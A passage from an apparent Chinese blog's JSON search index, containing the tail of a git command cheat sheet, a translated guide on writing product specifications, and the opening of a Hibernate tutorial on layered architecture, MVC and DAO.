 master' | xargs -n 1 git branch -d\n```\n\n## 展示本地分支关联远程仓库的情况\n```sh\ngit branch -vv\n```\n\n## 关联远程分支\n\n关联之后，`git branch -vv` 就可以展示关联的远程分支名了，同时推送到远程仓库直接：`git push`，不需要指定远程仓库了。\n```sh\ngit branch -u origin/mybranch\n```\n\n或者在 push 时加上 `-u` 参数\n```sh\ngit push origin/mybranch -u\n```\n\n## 列出所有远程分支\n\n-r 参数相当于：remote\n```sh\ngit branch -r\n```\n\n## 列出本地和远程分支\n\n-a 参数相当于：all\n```sh\ngit branch -a\n```\n\n## 查看远程分支和本地分支的对应关系\n\n```sh\ngit remote show origin\n```\n\n## 远程删除了分支本地也想删除\n\n```sh\ngit remote prune origin\n```\n\n## 创建并切换到本地分支\n```sh\ngit checkout -b <branch-name>\n```\n\n## 从远程分支中创建并切换到本地分支\n\n```sh\ngit checkout -b <branch-name> origin/<branch-name>\n```\n\n## 删除本地分支\n\n```sh\ngit branch -d <local-branchname>\n```\n\n## 删除远程分支\n\n```sh\ngit push origin --delete <remote-branchname>\n```\n\n或者\n\n```sh\ngit push origin :<remote-branchname>\n```\n\n## 重命名本地分支\n\n```sh\ngit branch -m <new-branch-name>\n```\n\n## 查看标签\n\n```sh\ngit tag\n```\n展示当前分支的最近的 tag\n\n```sh\ngit describe --tags --abbrev=0\n```\n\n## 查看标签详细信息\n\n```sh\ngit tag -ln\n```\n\n## 本地创建标签\n\n```sh\ngit tag <version-number>\n```\n\n默认 tag 是打在最近的一次 commit 上，如果需要指定 commit 打 tag：\n```sh\n$ git tag -a <version-number> -m \"v1.0 发布(描述)\" <commit-id>\n```\n\n## 推送标签到远程仓库\n\n首先要保证本地创建好了标签才可以推送标签到远程仓库：\n\n```sh\ngit push origin <local-version-number>\n```\n\n一次性推送所有标签，同步到远程仓库：\n\n```sh\ngit push origin --tags\n```\n\n## 删除本地标签\n\n```sh\ngit tag -d <tag-name>\n```\n\n## 删除远程标签\n\n```sh\ngit push origin --delete tag <tagname>\n```\n\n## 切回到某个标签\n\n一般上线之前都会打 tag，就是为了防止上线后出现问题，方便快速回退到上一版本。下面的命令是回到某一标签下的状态：\n```sh\ngit checkout -b branch_name tag_name\n```\n\n## 放弃工作区的修改\n```sh\ngit checkout <file-name>\n```\n\n放弃所有修改：\n```sh\ngit checkout .\n```\n\n## 恢复删除的文件\n```sh\ngit rev-list -n 1 HEAD -- <file_path> #得到 deleting_commit\n\ngit checkout <deleting_commit>^ -- <file_path> #回到删除文件 deleting_commit 之前的状态\n```\n\n## 以新增一个 commit 的方式还原某一个 commit 的修改\n\n```sh\ngit revert <commit-id>\n```\n\n## 回到某个 commit 的状态，并删除后面的 commit\n\n和 revert 的区别：reset 命令会抹去某个 commit id 之后的所有 commit\n\n```sh\ngit reset <commit-id>  #默认就是-mixed参数。\n\ngit reset --mixed HEAD^  #回退至上个版本，它将重置HEAD到另外一个commit,并且重置暂存区以便和HEAD相匹配，但是也到此为止。工作区不会被更改。\n\ngit reset --soft HEAD~3  #回退至三个版本之前，只回退了commit的信息，暂存区和工作区与回退之前保持一致。如果还要提交，直接commit即可  \n\ngit reset --hard <commit-id>  #彻底回退到指定commit-id的状态，暂存区和工作区也会变为指定commit-id版本的内容\n```\n\n## 修改上一个 commit 的描述\n\n如果暂存区有改动，同时也会将暂存区的改动提交到上一个 commit\n\n```sh\ngit commit --amend\n```\n\n## 查看 commit 历史\n```sh\ngit log\n```\n\n## 查看某段代码是谁写的\n\nblame 的意思为‘责怪’，你懂的。\n\n```sh\ngit blame <file-name>\n```\n\n## 显示本地更新过 HEAD 的 git 命令记录\n\n每次更新了 HEAD 的 git 命令比如 commit、amend、cherry-pick、reset、revert 等都会被记录下来（不限分支），就像 shell 的 history 一样。\n这样你可以 reset 到任何一次更新了 HEAD 的操作之后，而不仅仅是回到当前分支下的某个 commit 之后的状态。\n\n```sh\ngit reflog\n```\n\n## 修改作者名\n\n```sh\ngit commit --amend --author='Author Name <email@address.com>'\n```\n\n## 修改远程仓库的 url\n\n```sh\ngit remote set-url origin <URL>\n```\n\n## 增加远程仓库\n\n```sh\ngit remote add origin <remote-url>\n```\n\n## 列出所有远程仓库\n\n```sh\ngit remote\n```\n\n## 查看两个星期内的改动\n```sh\ngit whatchanged --since='2 weeks ago'\n```\n\n## 把 A 分支的某一个 commit，放到 B 分支上\n\n这个过程需要 `cherry-pick` 命令，[参考](http://sg552.iteye.com/blog/1300713#bc2367928)\n\n```sh\ngit checkout <branch-name> && git cherry-pick <commit-id>\n```\n\n## 给 git 命令起别名\n\n简化命令\n\n```sh\ngit config --global alias.<handle> <command>\n\n比如：git status 改成 git st，这样可以简化命令\n\ngit config --global alias.st status\n```\n\n## 存储当前的修改，但不用提交 commit\n\n详解可以参考[廖雪峰老师的 git 教程](http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137602359178794d966923e5c4134bc8bf98dfb03aea3000)\n```sh\ngit stash\n```\n\n## 保存当前状态，包括 untracked 的文件\n\nuntracked 文件：新建的文件\n```sh\ngit stash -u\n```\n\n## 展示所有 stashes\n```sh\ngit stash list\n```\n\n## 回到某个 stash 的状态\n```sh\ngit stash apply <stash@{n}>\n```\n\n## 回到最后一个 stash 的状态，并删除这个 stash\n\n```sh\ngit stash pop\n```\n\n## 删除所有的 stash\n\n```sh\ngit stash clear\n```\n\n## 从 stash 中拿出某个文件的修改\n```sh\ngit checkout <stash@{n}> -- <file-path>\n```\n\n## 展示所有 tracked 的文件\n```sh\ngit ls-files -t\n```\n\n## 展示所有 untracked 的文件\n```sh\ngit ls-files --others\n```\n\n## 展示所有忽略的文件\n\n```sh\ngit ls-files --others -i --exclude-standard\n```\n\n## 强制删除 untracked 的文件\n\n可以用来删除新建的文件。如果不指定文件文件名，则清空所有工作的 untracked 文件。`clean` 命令，**注意两点**：\n1. clean 后，删除的文件无法找回\n2. 不会影响 tracked 的文件的改动，只会删除 untracked 的文件\n\n```sh\ngit clean <file-name> -f\n```\n\n## 强制删除 untracked 的目录\n\n可以用来删除新建的目录，**注意**:这个命令也可以用来删除 untracked 的文件。详情见上一条\n\n```sh\ngit clean <directory-name> -df\n```\n\n## 展示简化的 commit 历史\n```sh\ngit log --pretty=oneline --graph --decorate --all\n```\n\n## 把某一个分支导出成一个文件\n```sh\ngit bundle create <file> <branch-name>\n```\n\n## 从包中导入分支\n\n新建一个分支，分支内容就是上面 `git bundle create` 命令导出的内容\n\n```sh\ngit clone repo.bundle <repo-dir> -b <branch-name>\n```\n\n## 执行 rebase 之前自动 stash\n\n```sh\ngit rebase --autostash\n```\n\n## 从远程仓库根据 ID，拉下某一状态，到本地分支\n\n```sh\ngit fetch origin pull/<id>/head:<branch-name>\n```\n\n## 详细展示一行中的修改\n\n```sh\ngit diff --word-diff\n```\n\n## 清除 gitignore 文件中记录的文件\n\n```sh\ngit clean -X -f\n```\n\n## 展示所有 alias 和 configs\n\n**注意：** config 分为：当前目录（local）和全局（golbal）的 config，默认为当前目录的 config\n\n```sh\ngit config --local --list (当前目录)\ngit config --global --list (全局)\n```\n\n## 展示忽略的文件\n```sh\ngit status --ignored\n```\n\n## commit 历史中显示 Branch1 有的，但是 Branch2 没有 commit\n```sh\ngit log Branch1 ^Branch2\n```\n\n## 在 commit log 中显示 GPG 签名\n```sh\ngit log --show-signature\n```\n\n## 删除全局设置\n\n```sh\ngit config --global --unset <entry-name>\n```\n\n## 新建并切换到新分支上，同时这个分支没有任何 commit\n\n相当于保存修改，但是重写 commit 历史\n\n```sh\ngit checkout --orphan <branch-name>\n```\n\n## 展示任意分支某一文件的内容\n\n```sh\ngit show <branch-name>:<file-name>\n```\n\n## clone 下来指定的单一分支\n```sh\ngit clone -b <branch-name> --single-branch https://github.com/user/repo.git\n```\n\n## clone 最新一次提交\n\n只会 clone 最近一次提交，将减少 clone 时间\n\n```sh\ngit clone --depth=1 https://github.com/user/repo.git\n```\n\n## 忽略某个文件的改动\n\n关闭 track 指定文件的改动，也就是 Git 将不会在记录这个文件的改动\n\n```sh\ngit update-index --assume-unchanged path/to/file\n```\n\n恢复 track 指定文件的改动\n\n```sh\ngit update-index --no-assume-unchanged path/to/file\n```\n\n## 忽略文件的权限变化\n\n不再将文件的权限变化视作改动\n\n```sh\ngit config core.fileMode false\n```\n\n## 以最后提交的顺序列出所有 Git 分支\n\n最新的放在最上面\n\n```sh\ngit for-each-ref --sort=-committerdate --format='%(refname:short)' refs/heads/\n```\n\n## 在 commit log 中查找相关内容\n\n通过 grep 查找，given-text：所需要查找的字段\n\n\n```sh\ngit log --all --grep='<given-text>'\n```\n\n## 把暂存区的指定 file 放到工作区中\n\n不添加参数，默认是 `-mixed`\n\n```sh\ngit reset <file-name>\n```\n\n## 强制推送\n\n```sh\ngit push -f <remote-name> <branch-name>\n```\n\n## git 配置 http 和 socks 代理\n\n```sh\ngit config --global https.proxy 'http://127.0.0.1:8001'   # 适用于 privoxy 将 socks 协议转为 http 协议的 http 端口\ngit config --global http.proxy 'http://127.0.0.1:8001'\ngit config --global socks.proxy \"127.0.0.1:1080\"\n```\n\n## git 配置 ssh 代理\n\n```sh\n$ cat ~/.ssh/config\nHost gitlab.com\nProxyCommand nc -X 5 -x 127.0.0.1:1080 %h %p    # 直接使用 shadowsocks 提供的 socks5 代理端口\n\nHost github.com\nProxyCommand nc -X 5 -x 127.0.0.1:1080 %h %p    \n```\n\n\n## 脑图\n\n![git](https://up-img.yonghong.tech/pic/2021/11/26-21-00-git-aLqUed.png)\n\n## 优雅的Commit信息\n\n使用[Angular团队提交规范](https://github.com/angular/angular.js/blob/master/DEVELOPERS.md#-git-commit-guidelines)\n\n主要有以下组成\n\n* 标题行: 必填, 描述主要修改类型和内容\n* 主题内容: 描述为什么修改, 做了什么样的修改, 以及开发的思路等等\n* 页脚注释: 放 Breaking Changes 或 Closed Issues\n\n常用的修改项\n\n* type: commit 的类型\n* feat: 新特性\n* fix: 修改问题\n* refactor: 代码重构\n* docs: 文档修改\n* style: 代码格式修改, 注意不是 css 修改\n* test: 测试用例修改\n* chore: 其他修改, 比如构建流程, 依赖管理.\n* scope: commit 影响的范围, 比如: route, component, utils, build...\n* subject: commit 的概述\n* body: commit 具体修改内容, 可以分为多行\n* footer: 一些备注, 通常是 BREAKING CHANGE 或修复的 bug 的链接.\n\n## commit工具\n\n可以使用[cz-cli](https://github.com/commitizen/cz-cli)工具代替 `git commit`\n\n全局安装\n\n```shell\nnpm install -g commitizen cz-conventional-changelog\n\necho '{ \"path\": \"cz-conventional-changelog\" }' > ~/.czrc\n```\n全局安装后使用 `git cz` 代替 `git commit`就可以了,如下图\n\n![gitcz](https://up-img.yonghong.tech/pic/2021/11/26-21-00-gitcz-GhI1WK.png)\n\n**[⬆ 返回顶部](#目录)**\n","categories":["技巧"],"tags":["技巧","速查","git"]},{"title":"产品文档撰写指南","url":"/2018/02/2018-02-21-on-writing-product-specs/","content":"\n[Gaurav Oberoi](https://www.linkedin.com/in/goberoi/) 是 SurveyMonkey 的（前）联合创始人，曾于 Amazon、Xmarks 先后从事工程师、产品经理等职位，在西雅图和硅谷有十余年的工作经验。  \n\n在这篇文章中他分享了他对于产品文档的看法，以及他撰写产品文档的常用流程。\n\n<!-- more -->\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-12-1-7fobHy.png)\n\n> 能写出六页结构清晰的备忘录的人，不可能没有清晰的思维。——杰夫·贝索斯，亚马逊\n\n# 如何写产品文档\n\n很多人听到「产品文档」这四个字就像吞了苍蝇一样，人们通常会认为这意味着又要花几周写一个根本没人看的文档。如果一个团队总被产品文档这种事情拖累，怎么可能「敏捷」得起来，怎么可能高效地产出代码？  \n\n我在过去十几年创造了多个数百万人使用的软件产品之后，越发认为这种观点是完全错误的。根据我的经验：  \n\n> 高效的产品文档是创造伟大产品的过程中所不可或缺的重要组成部分。撰写产品文档可以强制所有人从项目初始就理性思考，频繁沟通，明确权责——所有的这些都会带来更好的软件质量，更低的进度风险，以及更少的时间浪费。在这篇文章中，我会通过一个案例来分享一些普适的建议，这些建议会对大中型（超过二百人的）公司中的产品经理们非常有帮助。\n\n## 首先，举个例子。\n\n**假设你在这里工作：**  \n\n一家从事**在线旅游预订服务**（就像 Hotels 或者 Airbnb 但是规模更小一些）的公司。目前这家公司的支付转化率偏低，所以这个季度大家打算尝试通过**在支付环节加入在线客服**的方案来提升转化。 \n \n**你的工单/用户故事/路线图是：**  \n\n**通过在支付环节增加在线客服来尝试提高支付转化率。**\n\n支付转化率目前仅有 18％，而业内平均转化率有 30％。我们打算测试下在支付时展示在线客服聊天窗口是否可以提高这个转化率。用户运营团队已经同意了提供 1 人月的客服人力支持。  \n\n**在你没有产品文档时，你会这样做：**  \n\n比方说，你觉得行动起来总是最重要的，因此直接开始动手：  \n1. 在迭代计划会上，你和团队讨论了这个需求。\n2. 然后你挑选了一个靠谱的第三方客服供应商（例如 SnapEngage ）。\n3. 提交一个工单来让工程师添加一些 Javascript 代码。\n4. 和支持团队开个会，确定他们都准备好了\n\n搞定了！这么简单的事情怎么能要我们写产品文档呢？如果你是在一个小型创业团队，你也确实并不需要——因为产品改动相对小，涉及到的人也相对更少。 \n \n但如果你是在一个更大的组织之中，或者产品更加成熟/复杂，就会陆续出现下列这些问题，并且相比写文档，这些问题会需要更多时间来处理。例如： \n \n* 工程师把工单标记完成了，但是一验收测试，就发现这个功能完全没有考虑移动端的适配。\n * 「唉呀！你忘了提醒大家手机端的使用才是核心场景。」\n*  用户运营经理打算开展一个漫长的评审流程，以确定最合适的聊天服务商。\n *  「啊……需要定一个会议，向大家解释下这次上线只是一个灰度测试。」\n*  发布一小时后，客服报告说他们收到了西班牙语的在线聊天请求。\n *  「啥？要追加一个紧急发布，把这个测试限定在英语用户中。」\n*  一个设计师花了几天，为聊天窗口滑入屏幕的交互绘制了一个完美的动画。\n *  「用户体验过度优化，你是否对整个团队统一了「这次只是一个测试」的预期？」\n*  一周的测试完成之后，数据分析师发现无法产出你要的报告，因为相关的必要指标并没有埋点。\n *  「史诗级的失败。从头再来吧。」\n\n如果这是一个相对简单的项目，即使没有产品文档可能也不至于陷入这样的灾难之中。但是在简单的项目中你仍然有可能会因为没有文档浪费许多时间和机会成本。  \n\n**如果你写了一篇文档：**  \n\n为了便于说明，我准备了两个示例文档：一篇思路笔记，和一篇完整的产品文档示例——这样可以完整介绍产品文档的撰写流程。  \n\n请在继续阅读文章之前，花几分钟读一下这两篇示例文档吧。\n\n* 阅读 [示例思路笔记](/2018/02/21/product-example-notes/) （阅读时间 2 分钟）\n * 这是一个根据你已知的信息和想要解答的问题所梳理成的列表。这会是你需要做的第一件事情，大约需要一个小时来完成这个文档。这个文档会成为你和团队中其他人的一个沟通基础。\n* 阅读 [示例产品文档](/2018/02/21/product-example-spec/) （阅读时间 6 分钟）\n * 只有和团队一起评审了你的假设和创意之后（无论是在专门召集的会议上，喝咖啡时，或者桌上足球的休息时间），你才应该真正开始写产品文档。如果已经完成了沟通和评审，整个文档应该花费你 1-3 个小时的时间。\n\n啊哈！有了文档之后是不是就感觉踏实多了？写文档看起来是额外的工作成本，但是其实并不是，高效的文档可以帮助你和你的团队节约时间投入，并且在交付上线时会更有信心。  \n\n\n<span id=\"ihaveread\"></span>\n\n\n---\n\n**等等！——你已经读完示例文档了么？请务必先读完它再继续阅读下面的文章。**  \n\n---\n\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-12-2-F0icOA.png)\n\n> 与工程师进行书面沟通是更好的（相对于口头沟通），因为书面沟通避免了歧义，更恒久，也更容易明确权责。\n\n## 文档撰写指南\n\n我通过示例文档诠释了这篇文章中所讲述的思考，在继续阅读全文之前，请务必确认你已经阅读了 示例产品文档。  \n  \n### 为什么要写产品文档？  \n\n> 为了以更高的质量、更快的速度和更佳的预判来交付正确的产品。  \n\n是的，就是这样。那么，产品文档将如何帮助你做到这一切呢？Ben Horowitz 分享了上图中这个看法，我的示例文档也是一个很好的例证。明确一下要点：\n\n**1. 从一开始就理性思考**  \n在团队开始付出更高成本去设计软件架构、实施代码开发、完善界面设计、测试软件质量之前，写文档可以迫使你提前思考每一个细节。这将会提高你决策的质量，降低意外事件发生的概率。  \n\n**2. 高效沟通**  \n你常常需要和不同的利益相关方（支持团队，工程团队，设计团队，财务团队，管理层等等）沟通你的方案。产品文档可以帮助你事半功倍地完成沟通，避免口头沟通中产生的歧义，团队中的所有人可以更好地理解你的意图，并且更有的放矢地做出答复。  \n\n**3. 明确权责**  \n\n明确项目目标的评价标准，公开承诺奖惩激励机制：利益相关方可以知晓如果最后一刻变更需求会意味着什么，工程师们也会在预估工期时再三斟酌。\n\n### 产品文档中应当包含哪些内容？\n\n产品文档应该明确沟通要做一个「什么」产品，以及「为什么」要这么做。用来说明清楚一个产品的表达方式很多，但最核心的，一定要说清楚这五件事情：  \n\n**1. 问题**   \n描绘你此次打算解决的问题。更重要的是，解释为什么要去解决这个问题。描述要尽可能地具体，并且提供相关的数据指标。  \n\n**2. 可衡量的目标**      \n明确承诺交付和成果，明确哪些事情超出了此项目的范畴。每一个目标，都应该可以明确衡量「是否达到目标」。  \n\n**3. 需求背景**  \n提供你的观众理解当前问题以及接受你的提议所需的所有背景信息。包括但不限于假设、用例、数据指标等信息。  \n\n**4. 解决方案详情**    \n你的提议应该有充足的细节，易于团队成员消化理解及执行——可以把这部分内容想象成对人脑进行编程和执行。 \n \n**5. 时间轴**    \n列出你的团队共同认可的截止日期和其他重要时间点。这部分内容开始的时候可能会比较模糊，但是在最后一次文档评审之前应当完全敲定。\n\n你可以使用我的示例文档做你的文档模板，按照你的想法增/删/改任何章节。只要你能够清晰并且条理清楚地表述上面提到的这五点信息，文档形式并不重要。  \n\n### 如何写产品文档？ \n\n接下来我会介绍我撰写和评审文档的常规流程。根据项目大小，利益相关方的数量不同等情况，流程细节可能会有所变化，但是大体的流程是确定的。\n\n**1. 快速完成一个草稿（1-2 个小时）**  \n关闭电子邮件和聊天工具。泡杯茶，坐在椅子上开始思考，然后逐一把你所了解的信息列成清单（见上文中的 示例思路笔记 ）。  \n\n**2. 安排几个 30 分钟的一对一会议 （1-4 个小时）**  \n这个步骤的目的是过一遍文档中的细节，优化你的方案，并且获得更多人的支持。尽可能控制这些会议的规模，人越少越好（理想状态下都应该是一对一会议）。在本文的示例中，我会和客服部门的负责人，一个财务人员和一个工程师分别安排一次会议。  \n\n**3. 撰写和编辑文档 （0.5-3 天）**  \n此时，你应该对能做，并且应该做什么有了一个明确的想法，但是大脑中塞满了大量的细节等待着梳理清楚。于是接下来需要将所有这些细节都整理出来，并且逐一梳理斟酌。在完成第一版文档之后，需要继续大篇幅编辑修改，通常最终的文档可以在你的第一版草稿的基础上压缩 30%-50% 的长度，简洁和清晰的文档就意味着更加容易阅读。大部分文档都可以在半天到一天的时间里完成，不过实际上也会有一些文档需要两三天才能写完。  \n\n**4. 群发文档并且安排一个 1 小时的评审会议（15 分钟）**  \n将文档群发给项目的所有利益相关方，并且抄送给其他可能对文档感兴趣的团队（例如你所在的产品团队，整个支持团队等）。跟进这些关键人员是否接受了会议邀请：将会执行这件事情的人，和所有对这件事情有通过/否决权力的人。  \n\n**5. 评审文档（1小时）**   \n在开始会议之前，询问是否有参会者没有详细阅读你的文档。通常都会有一两个人中枪，在这种情况下可以说：「没问题，我们先用 10 分钟一起来看一下文档。已经读过文档的人可以利用这个时间先放松休息一下」。这次会议上你需要获得利益相关方的同意，并且获得执行方（工程师、支持团队等）的知晓、认可以及人力支持。你可能需要开多次评审会议，并且根据评审会议上沟通的信息不断修改文档。  \n\n**6. 通过评审后，及时同步信息和建立工单 （1-2 小时）**  \n会后同步信息的电子邮件需要包含更新后的产品文档链接，和此项目相关的工单链接（例如「在页面上添加 JavaScript 代码」，「完成数据分析报告」，「测试 Staging 环境」，「和支持团队预演流程」，等等）。一般接下来将会有一位工程师完成技术文档，不过并不总是这样（文中的示例项目就不需要这一步）。  \n\n### 写出高效产品文档的进阶技巧\n\n**1. 尽量简短**  \n没有比这更重要的文档写作建议了。简洁意味着清晰的思路和沟通，也意味着你的文档更加易于阅读和理解——这一点至关重要。\n\n**2. 使用平白的语言和简单的格式**  \n使用简短而不是花哨的语句，使用列表和加粗强调可以使文章更一目了然，以放松有趣的方式写作而不是一板一眼，如果你有得体的幽默感就再好不过了。\n\n**3. 为开发团队预留时间**  \n通过评审并且达成一致通过的文档才是完善的文档。如果你希望在未来的某一个迭代 Sprint 中开发此项目，就应该提前两到三周开始这个产品文档写作流程。\n\n**4. 像工程师一样思考**  \n在项目得以进入开发之时，常常会发现大量未预料到的边缘情况——但这种情形其实可以避免。如果你认真考虑过项目进入开发的所有必要条件，你就可以提前发现这些问题（例如，是否在移动设备中可以使用在线聊天功能？）。\n\n**5. 确保每一个人都跟上了你的节奏**  \n当我组织产品评审时，会议室里的大部分人都已经大致了解我要讲的内容——因为我已经提前在讨论会和日常聊天中沟通过这个事情了。既然大家都已经清楚了「做什么」和「为什么要做」的问题，文档评审会上我们只要关注实施细节就好了。\n\n**6. 在图表中下功夫**  \n流程图、线框图等图表可以通过易于理解的方式提供很大的信息量，同时也需要消耗非常多的时间来制作这些图表。\n\n**7. 在思考和写文档上花 0.5-3 天时间**  \n具体时间根据项目大小而定。花费在写文档上的时间越长，所带来的边际收益就会递减。特别需要指出的是，没有人能够读的下去超过 5-6 页的文档。\n\n**8. 指明方向，明晰愿景**  \n你不仅仅是在定义一个功能，也是在解释「为什么我们要做这件事情」以及「我们的目标是什么」，在文档中指出这个项目将会对更高层面的规划造成什么影响，以及接下来会发生什么。\n\n**9. 确保你的观众阅读了文档**  \n如果你的文档又臭又长，或者从来不分享给对应的人，那你还不如不写文档。务必确保你的文档被对应的人阅读了，我上面关于评审开始时留时间给大家读文档的建议值得大家参考。\n\n**10. 获取真诚的反馈**  \n你的文档是否是在赘述人尽皆知的事情？或者是文档缺乏足够的细节？是否在后续实施中发现了太多的边缘情况？又或者，是否在制定计划和文档评审上耗费了太多的时间？你应该和你的团队时刻保持沟通。\n\n\n## 说好的敏捷开发（Agile/Scrum）呢？  \n\n我知道会有争议，但是产品文档和[敏捷宣言的原则](http://agilemanifesto.org/principles.html)（[中文版](http://agilemanifesto.org/iso/zhchs/manifesto.html)）没有丝毫冲突，并且在类似于 Scrum 这样的敏捷方法上得到了充分发挥——毕竟，用户故事（Story）许多时候需要详尽的描述，文档可以增加沟通中的清晰度和可传播性，为什么非要刻板地认为仅仅使用口头沟通和使用白板才算是敏捷开发呢？「产品文档会导致发布变慢，过度规划，通常会浪费时间」的想法完全是无稽之谈。我工作过的多个世界级团队遵循着一些敏捷原则（例如两周一个迭代周期），每天（甚至更频繁地）发布代码，并且以发布产品（而不是文档或者会议）作为衡量成功的标准——也都仍然认为文档是他们打造成功软件的一个关键部分。\n\n## 你对技术文档怎么看？\n\n我是一个技术文档的支持者。产品文档通常关注「做什么」 ，而技术文档更多关注在「如何做」 。这两种文档为研发流程中的不同环节带来同样的清晰视角，并且都使得工程师（和他们的用户）身心愉悦。未来如果大家有兴趣的话我可能会写一篇关于技术文档的文章。\n\n## 总结  \n\n感谢你读到这里。如果你认为这篇文章有用，请分享给其他人——特别是你的产品/工程团队。如果你想看更多的产品经理内容（例如：规划产品路线图），或者想了解其他人如何使用产品文档， 请用两分钟填写这个小调查（英文） 。\n\n我会在未来的文章中分享调查结果中有意思的信息。\n\n以上，祝写文档愉快！\n\n## 备注\n\n1. 感谢[周思博](http://www.joelonsoftware.com/AboutMe.html)（Joel Spolsky） （微软早期 PM，曾参与创办 Stack Overflow，Trello，FogBugz 等产品，《软件随想录》作者）的「文档是对人脑的编程」的比喻。早在2000年，他写了4 篇[关于文档的系列文章](http://www.joelonsoftware.com/articles/fog0000000036.html)（英文） ，这对我的 PM 道路产生了巨大的影响，强烈推荐。\n2. 在顶部的引文中，贝索斯所说的笔记是指为高层管理会议使用的，介绍新业务/产品创意的备忘录。这实际上不算是产品文档，但是两者并不是完全不一样。贝索斯在会议开始的时候会组织所有人默读文件——这激发了我在文档评审时做同样的事情。[来源](http://fortune.com/2012/11/16/amazons-jeff-bezos-the-ultimate-disrupter/)\n3. 感谢 iDoneThis 博客这篇[关于写作的价值的文章](http://blog.idonethis.com/managers-write/)（英文）。这是贝索斯和 Horowitz 的引言的来源。\n\n感谢 Vikram Oberoi 。\n\n## 来源\n\n原文链接：[On Writing Product Specs](https://goberoi.com/on-writing-product-specs-5ca697b992fd)\n\n翻译链接：[国外的产品经理是如何写需求文档的？ - 刘涵宇的回答 - 知乎](https://www.zhihu.com/question/27816922/answer/131940412)","categories":["文档指南"],"tags":["产品文档","文档指南"]},{"title":"Hibernate 原理及实战（一）","url":"/2018/07/2018-07-25-hibernate/","content":"\n### 1.三层架构分层\n\n> 三层架构(3-tier architecture) 通常意义上的三层架构就是将整个业务应用划分为：**界面层（User Interface layer）、业务逻辑层（Business Logic Layer）、数据访问层（Data access layer）**。区分层次的目的即为了“**高内聚低耦合**”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构。**微软**推荐的分层式结构一般分为三层，从下至上分别为：**数据访问层、业务逻辑层（又或称为领域层）、表示层**。\n> \n> (注：层，英文是tier（物理上）、layer（逻辑上）。)\n\n<!-- more -->\n\n1.数据访问层：主要是对非原始数据（数据库或者文本文件等存放数据的形式）的操作层，而不是指原始数据，也就是说，是对数据库的操作，而不是数据，具体为业务逻辑层或表示层提供数据服务。\n\n2.业务逻辑层：主要是针对具体的问题的操作，也可以理解成对数据层的操作，对数据业务逻辑处理，如果说数据层是积木，那逻辑层就是对这些积木的搭建。\n\n3.界面层：主要表示WEB方式，也可以表示成WINFORM方式，WEB方式也可以表现成：aspx，如果逻辑层相当强大和完善，无论表现层如何定义和更改，逻辑层都能完善地提供服务。\n\n---\n\n表现层（Presentation layer）：表现层可以说是距离用户最近的层，主要是用于接收用户输入的数据和显示处理后用户需要的数据。一般表现为界面，用户通过界面输入查询数据和得到需要的数据。\n\n业务逻辑层（Business Logic Layer）：业务逻辑层是处于表现层和数据访问层之间，主要是从数据库中得到数据然后对数据进行逻辑处理。\n\n数据访问层（Data access layer）：数据访问层是直接和数据库打交道的，对数据进行“增、删、改、查”等基本的操作。\n\n---\n\n\n### 2.MVC 思想\n\nMVC 全名是 Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写。MVC是一个设计模式，它强制性的使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心部件：模型（M）、视图（V）、控制器（C），它们各自处理自己的任务。\n\nModel（模型）是应用程序中用于处理应用程序数据逻辑的部分。\n\n通常模型对象负责在数据库中存取数据。\n\nView（视图）是应用程序中处理数据显示的部分。\n\n通常视图是依据模型数据创建的。\n\nController（控制器）是应用程序中处理用户交互的部分。\n\n通常控制器负责从视图读取数据，控制用户输入，并向模型发送数据。\n\n\n### 3.一些概念\n\n#### 3.1.模型 Model\n\n模型是MVC中的概念，指的是读取数据和改变数据的操作（业务逻辑）。一开始我们直接把和数据库相关的代码放在模型里(sql直接写在代码中)，这样就会导致以后的维护相当麻烦。业务逻辑的修改都需要开发者重新写sql，如果项目需要分库，需要将sql语句抽出来，放到单独的一层。这一层就是DAL(数据访问层)。\n\n#### 3.2.持久层Persistence\n\n持久层只是一个逻辑概念而已，主要任务是负责把数据保存起来，一般是指保存至数据库或者文件，也可以负责完成与之相关的行为。\n\n持久层指的是把数据长期保存起来，如数据库把数据长期保存在硬盘里，XML也可以长期保存数据，还有如果把数据存放到指定文件中，也可以成为持久层。\n\n持久化可以理解为动词。Java中的Hibernate做的就是持久化的操作，主要是对数据库底层的OR映射，这样我们就不必关心讨厌的关系映射了，直接操作对象就可以了。\n\n#### 3.3.DAL Data Access Layer，数据访问层\n\nDAL是三层架构(表现层，业务逻辑层，数据访问层)中的数据访问层，是一个概念或者说是一个方案，它由许多DAO组成，或者说由DAO具体实现，是把和数据库相关的代码封装起来，这样当我们执行分库时，便只用调整DAO的代码了，模型根本不用关心它使用的数据是放在A库还是B库。\n\n设计数据访问层接口的目的是让业务逻辑层不去调用具体的数据访问层的实现（不依赖于数据访问层具体的实现技术），这样的好处是，业务逻辑不必管数据访问层具体是什么技术来实现的，接口是不变的。\n\n使用DAL的优势如下：\n\n1、开发人员可以只关注整个结构中的其中某一层；\n\n2、可以很容易的用新的实现来替换原有层次的实现；\n\n3、可以降低层与层之间的依赖；\n\n4、有利于标准化；\n\n5、利于各层逻辑的复用。\n\n概括来说，分层式设计可以达至如下目的：分散关注、松散耦合、逻辑复用、标准定义。\n\n降低耦合性的实际应用如下：\n\n业务逻辑不必管数据访问层具体是什么技术来实现的，接口是不变的，数据访问层可以用jdbc来实现，也可以用hibernate来实现，而且更换起来不是非常麻烦，这样耦合就降低了\n\n#### 3.4.DAO data access object，数据访问对象\n\nDAO是一个软件设计的指导原则，在核心J2EE模式中是这样介绍DAO模式的：为了建立一个健壮的J2EE应用，应该将所有对数据源的访问操作抽象封装在一个公共API中。用程序设计的语言来说，就是建立一个接口，接口中定义了此应用程序中将会用到的所有事务方法。在这个应用程序中，当需要和数据源进行交互的时候则使用这个接口，并且编写一个单独的类来实现这个接口在逻辑上对应这个特定的数据存储。\n\n顾名思义就是与数据库打交道，夹在业务逻辑与数据库资源中间，是DAL的具体实现。\n\n简单的说 dao层 就是对数据库中数据的增删改查等操作封装在专门的类里面，在业务逻辑层中如果要访问数据的时候，直接调用该dao类（包括了如何访问数据库和数据的增删改查等等代码），就可以返回数据，而不需要再在业务逻辑层中写这些代码。\n\n#### 3.5.ORM object-relational 